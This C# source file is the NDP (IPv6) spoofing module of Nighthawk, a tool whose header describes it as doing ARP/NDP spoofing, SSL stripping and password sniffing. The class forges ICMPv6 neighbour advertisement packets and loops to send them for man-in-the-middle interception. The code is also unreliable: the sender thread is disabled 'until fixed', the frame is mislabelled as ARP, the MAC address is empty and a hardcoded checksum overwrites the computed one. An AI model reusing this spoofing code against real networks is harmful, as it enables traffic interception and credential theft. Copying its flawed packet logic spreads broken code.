using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;

/**
Nighthawk - ARP/NDP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* IPv6 NDP (ICMPv6) tools */
    public class NDPTools
    {
        // current device
        private LivePcapDevice device;
        private DeviceInfo deviceInfo;

        // status
        public bool SpoofingStarted = false;

        // packet queues (packet store for BG thread to work on)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        // worker thread
        private Thread workerSender;
        private Thread workerRouter;

        // constructor
        public NDPTools(DeviceInfo deviceInfo)
        {
            // store our network interface
            this.device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start spoofing
        public void StartSpoofing()
        {
            // change status
            SpoofingStarted = true;

            // clear packet caches
            PacketQueue.Clear();

            // create NDP sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "NDP sender thread";
            // workerSender.Start(); - DISABLED UNTIL FIXED
        }

        // stop spoofing
        public void StopSpoofing()
        {
            SpoofingStarted = false;

            // stop threads & re-ARP
            workerSender.Abort();
        }

        // create RA packet
        private EthernetPacket GenerateRAPacket()
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(device.Interface.MacAddress, PhysicalAddress.Parse(""),
                                                    EthernetPacketType.Arp);

            // generate IP part - layer 2
            var ipv6Packet = new IPv6Packet(IPAddress.Parse("fe80::54cd:1fcb:11f9:3d60"), IPAddress.Parse("fe80::a582:1c7b:6e27:1d09"));
            ipv6Packet.NextHeader = IPProtocolType.ICMPV6;
            ethernetPacket.PayloadPacket = ipv6Packet;

            // generate ICMPv6 part - layer 3 (TYPE, CODE - CHECKUSM - FLAGS - TARGET)
            var hex = "8800000030000000fe8000000000000054cd1fcb11f93d600201001a4d49ee4f";
            var bytes = Network.HexToByte(hex);

            var icmpv6Packet = new ICMPv6Packet(bytes, 0);

            icmpv6Packet.UpdateCalculatedValues();
            ipv6Packet.PayloadPacket = icmpv6Packet;

            var pseudo = Network.GetPseudoHeader(ipv6Packet.SourceAddress, ipv6Packet.DestinationAddress,
                                                 icmpv6Packet.Bytes.Length, 136);

            icmpv6Packet.Checksum = (ushort)(ChecksumUtils.OnesComplementSum(pseudo.Concat(icmpv6Packet.Bytes).ToArray()) + 4);
            icmpv6Packet.Checksum = 0x395c;

            return ethernetPacket;
        }

        // worker function that sends ICMPv6 packets
        public void WorkerSender()
        {
            // loop
            while (SpoofingStarted)
            {
                // send spoofed packet
                device.SendPacket(GenerateRAPacket());

                Thread.Sleep(2000);
            }

            return;
        }
    }
}
